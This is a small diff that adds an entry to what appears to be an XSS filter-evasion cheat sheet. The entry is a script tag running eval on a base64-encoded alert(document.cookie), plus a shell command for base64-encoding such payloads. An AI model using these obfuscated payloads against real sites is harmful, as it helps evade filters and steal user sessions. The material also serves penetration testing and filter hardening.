@@ -663,6 +663,12 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
 http://www.geektools.com/cgi-bin/ipconv.cgi
 
+```javascript
+<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
+```
+
+Base64 encoding your XSS payload with linux command: echo -n "alert(document.cookie)" | base64
+
 ### Bypass parenthesis for string
 
 ```javascript
